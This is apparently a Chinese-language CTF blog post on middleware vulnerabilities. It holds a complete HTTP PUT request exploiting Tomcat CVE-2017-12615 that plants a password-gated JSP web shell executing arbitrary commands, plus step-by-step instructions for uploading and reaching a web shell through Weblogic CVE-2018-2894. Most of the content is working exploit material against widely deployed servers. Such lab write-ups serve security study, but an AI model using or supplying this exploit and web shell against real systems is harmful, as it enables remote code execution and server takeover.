---
layout: post
title:  中间件安全
date:   2022-06-14 00:08:01 +0300
image:  2022-06-14-oktoberfest.jpg
tags:   [web]
---

Tomcat远程代码执行（CVE-2017-12615）

文件名后面跟一个'/'

```assembly
PUT /1.jsp/ HTTP/1.1
Host: node4.buuoj.cn:29901
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type:application/x-www-form-urlencoded
Content-Length: 386

<%
    if("x".equals(request.getParameter("pwd")))
    {
        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1)
        {
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

http://node4.buuoj.cn:29901/1.jsp?pwd=x&i=env

得到flag

# Weblogic（CVE-2018-2894）

访问`http://your-ip:7001/ws_utc/config.do`，设置Work Home Dir为`/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css`。我将目录设置为`ws_utc`应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。

然后点击安全 -> 增加，然后上传webshell：

得到时间戳1655292906166

然后访问`http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]`，即可执行webshell